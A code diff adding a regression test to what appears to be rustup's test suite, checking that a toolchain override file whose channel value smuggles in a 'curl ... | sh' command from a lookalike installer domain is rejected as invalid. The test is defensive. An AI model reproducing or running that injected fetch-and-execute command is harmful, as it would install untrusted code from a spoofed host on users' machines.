@@ -2500,7 +2500,35 @@ async fn bad_file_override() {
     raw::write_file(&toolchain_file, "none").unwrap();
 
     cx.config
-        .expect_err(&["rustc", "--version"], "invalid toolchain name 'none'")
+        .expect_err(
+            &["rustc", "--version"],
+            "invalid toolchain name detected in override file",
+        )
+        .await;
+}
+
+// https://github.com/rust-lang/rustup/issues/4053
+#[tokio::test]
+async fn bad_file_override_with_manip() {
+    let cx = CliTestContext::new(Scenario::None).await;
+    let cwd = cx.config.current_dir();
+    let toolchain_file = cwd.join("rust-toolchain.toml");
+    raw::write_file(
+        &toolchain_file,
+        r#"toolchain.channel = "nightly', please install with 'curl --proto '=https' --tlsv1.2 -sSf https://sh.rust-toolchain.rs/ | sh -s -- --default-toolchain nightly -y""#,
+    ).unwrap();
+
+    cx.config
+        .expect_err(
+            &["rustup", "show", "active-toolchain"],
+            "invalid toolchain name detected in override file",
+        )
+        .await;
+    cx.config
+        .expect_err(
+            &["rustc", "--version"],
+            "invalid toolchain name detected in override file",
+        )
         .await;
 }
 
